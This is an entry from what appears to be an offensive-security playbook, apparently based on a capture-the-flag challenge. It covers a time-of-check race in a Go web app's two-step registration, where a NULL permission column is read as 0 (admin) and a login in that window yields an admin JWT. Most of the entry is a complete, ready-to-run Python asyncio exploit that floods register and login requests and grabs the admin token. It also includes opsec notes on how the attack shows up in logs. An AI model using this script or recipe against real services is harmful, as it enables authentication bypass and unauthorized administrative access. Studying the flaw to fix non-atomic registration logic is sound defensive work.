# Race Condition Attacks

### Go Registration TOCTOU → NULL Permission Admin JWT [added: 2026-05]
- **Tags:** #RaceCondition #TOCTOU #PrivEsc #AuthBypass #Go #JWT #NullPermission #RegistrationRace #AsyncExploit #WebRace #NonAtomicDB
- **Trigger:** Go web app registration flow; source code shows two separate DB calls (CreateUser then UpdatePermissions) rather than a single atomic transaction; permission column has no DEFAULT value in schema; admin permission value is 0 (Go integer zero-value)
- **Prereq:** Registration endpoint accessible; app uses Go with standard `database/sql` scanning into `int` (not `sql.NullInt64`); permission_level column can be NULL; `PermissionAdmin = 0` in constants
- **Yields:** JWT with admin privileges issued during the NULL-permission race window; admin-level access to all protected endpoints including flag/secret retrieval
- **Opsec:** Med (generates many concurrent registration+login attempts; anomalous account creation volume visible in logs)
- **Context:** Two-step registration (CreateUser → UpdatePermissions) creates a race window where the user exists in the DB with `permission_level = NULL`. If a login request is processed during this window, Go's `database/sql` scans NULL into `var userPerms int` as `0` (the integer zero-value). If `PermissionAdmin = 0`, the JWT is minted with admin privileges. Python `threading` fails due to GIL; `asyncio` + `aiohttp` achieves true concurrency needed to reliably hit the nanosecond window. Fire 1 register + 30 simultaneous login requests per attempt; success typically within 5–20 attempts.
- **Payload/Method:**
```python
#!/usr/bin/env python3
# pip install aiohttp
import asyncio, aiohttp, random, string

BASE_URL = "https://<target>"
PLATFORM_TOKEN = "<platform-jwt-cookie-if-required>"

def rand_user():
    return ''.join(random.choices(string.ascii_lowercase, k=10))

async def do_register(session, username, password):
    try:
        async with session.post(f"{BASE_URL}/auth/register", data={
            'username': username, 'password': password,
            'profile_picture_url': 'https://example.com/avatar.png'
        }) as r:
            return await r.text()
    except: pass

async def do_login(session, username, password):
    try:
        async with session.post(f"{BASE_URL}/auth/login",
                                data={'username': username, 'password': password}) as r:
            if r.status == 200:
                data = await r.json()
                return data.get('token')
    except: pass
    return None

async def check_admin(session, token):
    try:
        async with session.get(f"{BASE_URL}/admin",
                               cookies={'booth_session': token}) as r:
            return r.status == 200
    except: return False

async def race_attempt(session, username, password, num_logins=30):
    tasks = [do_register(session, username, password)] + \
            [do_login(session, username, password) for _ in range(num_logins)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results[1:] if isinstance(r, str) and len(r) > 50]

async def main():
    password = "password123"
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
    cookies = {'token': PLATFORM_TOKEN}
    async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
        for i in range(500):
            username = rand_user()
            print(f"[{i+1}] Racing {username}...", end=" ", flush=True)
            tokens = await race_attempt(session, username, password, num_logins=30)
            if tokens:
                print(f"Got {len(tokens)} token(s)!")
                for token in tokens:
                    if await check_admin(session, token):
                        print(f"\n[!] Admin JWT: {token[:60]}...")
                        # Access flag endpoint
                        async with session.post(f"{BASE_URL}/admin/confessions/approve/flag",
                                                cookies={'booth_session': token}) as r:
                            print(f"[FLAG] {await r.text()}")
                        return
            else:
                print("No tokens")

asyncio.run(main())
```
